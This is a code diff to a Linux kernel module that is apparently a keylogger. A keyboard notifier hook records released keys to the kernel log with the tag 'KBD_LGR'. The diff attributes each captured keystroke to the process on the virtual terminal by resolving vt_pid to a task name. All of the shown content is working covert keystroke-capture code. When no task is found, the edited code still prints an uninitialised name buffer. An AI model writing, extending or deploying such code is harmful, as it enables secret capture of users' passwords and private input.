@@ -2,6 +2,10 @@
 #include <linux/init.h>
 #include <asm/current.h>
 #include <linux/sched.h>
+#include <linux/pid.h>
+#include <linux/tty.h>
+#include <linux/kd.h>
+#include <linux/console_struct.h>
 
 // Keyboard hook
 #include <linux/keyboard.h>
@@ -29,14 +33,22 @@ int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     unsigned char type = param->value >> 8;
     unsigned char val  = param->value & 0x00ff;
+    struct pid *vt_pid = param->vc->vt_pid;
+    struct task_struct  *task = NULL;
     char buff[BUFLEN];
-//     char proc_name[TASK_COMM_LEN];
+    char proc_name[TASK_COMM_LEN];
 
     // we only catch keys on the way up
     if(param->down)
         return NOTIFY_OK;
     
-//     strlcpy(proc_name, current->comm, TASK_COMM_LEN);
+    // convert pid to task struct
+    task = pid_task(vt_pid, PIDTYPE_PID);
+    
+    if(task != NULL)
+        strlcpy(proc_name, task->comm, TASK_COMM_LEN);
+    
+    // clear out the buffer
     memset(buff, 0, BUFLEN);
 
     // check for back space or delete first, then letters & numbers
@@ -54,7 +66,7 @@ int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
     if(buff[0] == '\0' || buff[0] == '<')
         return NOTIFY_OK;
 
-    printk(KERN_INFO "KBD_LGR\t%d: %s\n", current->pid, buff);
+    printk(KERN_INFO "KBD_LGR\t%s: %s\n", proc_name, buff);
     
     
 
